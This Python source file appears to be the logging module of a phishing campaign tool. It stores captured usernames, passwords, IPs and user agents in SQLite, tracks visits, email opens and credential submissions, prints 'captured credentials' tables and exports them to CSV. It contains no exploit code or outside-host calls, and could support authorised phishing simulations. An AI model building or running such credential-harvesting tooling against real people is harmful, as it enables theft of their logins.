import os
import csv
import sqlite3
from datetime import datetime
from modules.utils import log_event, color
from modules import config

LOGS_DIR = os.path.join(os.path.dirname(__file__), "..", "data", "logs")


def _db_path():
    p = config.get("logging", "db_path", "campaigns.db")
    return os.path.join(os.path.dirname(__file__), "..", p)


def _get_conn():
    conn = sqlite3.connect(_db_path())
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with _get_conn() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS credentials (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign  TEXT,
                token     TEXT,
                ip        TEXT,
                user_agent TEXT,
                username  TEXT,
                password  TEXT,
                raw_data  TEXT,
                timestamp TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS events (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign  TEXT,
                token     TEXT,
                action    TEXT,
                timestamp TEXT
            )
        """)


def log_credential(campaign, token, ip, ua, username, password, raw_data):
    init_db()
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with _get_conn() as conn:
        conn.execute("""
            INSERT INTO credentials (campaign, token, ip, user_agent, username, password, raw_data, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (campaign, token, ip, ua, username, password, str(raw_data), ts))


def log_event_db(campaign, token, action):
    init_db()
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with _get_conn() as conn:
        conn.execute("""
            INSERT INTO events (campaign, token, action, timestamp)
            VALUES (?, ?, ?, ?)
        """, (campaign, token, action, ts))


def view_logs(campaign=None):
    init_db()
    conn = _get_conn()

    # ── Credentials ────────────────────────────────────────────────────────────
    query = "SELECT * FROM credentials"
    params = ()
    if campaign:
        query += " WHERE campaign = ?"
        params = (campaign,)

    rows = conn.execute(query, params).fetchall()

    print(color("\n" + "═" * 70, "cyan"))
    print(color(f"  CAPTURED CREDENTIALS — {campaign or 'ALL CAMPAIGNS'}", "cyan"))
    print(color("═" * 70, "cyan"))

    if not rows:
        print(color("  No credentials captured yet.", "yellow"))
    else:
        print(color(f"  {'#':<4} {'Campaign':<14} {'Token':<10} {'IP':<16} {'Username':<24} {'Password':<20} {'Time'}", "blue"))
        print(color("  " + "─" * 66, "blue"))
        for r in rows:
            print(f"  {r['id']:<4} {r['campaign']:<14} {r['token']:<10} {r['ip']:<16} "
                  f"{color(r['username'], 'green'):<33} {color(r['password'], 'red'):<29} {r['timestamp']}")

    # ── Events ─────────────────────────────────────────────────────────────────
    query2 = "SELECT * FROM events"
    if campaign:
        query2 += " WHERE campaign = ?"

    events = conn.execute(query2, params).fetchall()

    print(color("\n" + "═" * 70, "cyan"))
    print(color(f"  EVENTS — {campaign or 'ALL CAMPAIGNS'}", "cyan"))
    print(color("═" * 70, "cyan"))

    if not events:
        print(color("  No events recorded yet.", "yellow"))
    else:
        actions = [e["action"] for e in events]
        print(color(f"  Visited: {actions.count('visited')}  |  "
                    f"Email Opened: {actions.count('email_opened')}  |  "
                    f"Submitted: {actions.count('credentials_submitted')}", "magenta"))
        print(color("  " + "─" * 66, "blue"))
        print(color(f"  {'#':<4} {'Campaign':<14} {'Token':<10} {'Action':<28} {'Time'}", "blue"))
        print(color("  " + "─" * 66, "blue"))
        for e in events:
            action_clr = "green" if "submitted" in e["action"] else "cyan"
            print(f"  {e['id']:<4} {e['campaign']:<14} {e['token']:<10} "
                  f"{color(e['action'], action_clr):<37} {e['timestamp']}")

    print(color("═" * 70 + "\n", "cyan"))
    conn.close()


def export_logs(campaign: str):
    init_db()
    os.makedirs(LOGS_DIR, exist_ok=True)
    conn = _get_conn()

    creds = conn.execute(
        "SELECT * FROM credentials WHERE campaign = ?", (campaign,)
    ).fetchall()

    cred_path = os.path.join(LOGS_DIR, f"{campaign}_credentials.csv")
    with open(cred_path, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["id", "campaign", "token", "ip", "user_agent", "username", "password", "raw_data", "timestamp"])
        for r in creds:
            writer.writerow(list(r))

    evts = conn.execute(
        "SELECT * FROM events WHERE campaign = ?", (campaign,)
    ).fetchall()

    evt_path = os.path.join(LOGS_DIR, f"{campaign}_events.csv")
    with open(evt_path, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["id", "campaign", "token", "action", "timestamp"])
        for e in evts:
            writer.writerow(list(e))

    print(color(f"\n[✓] Exported credentials → {cred_path}", "green"))
    print(color(f"[✓] Exported events      → {evt_path}\n", "green"))
    conn.close()
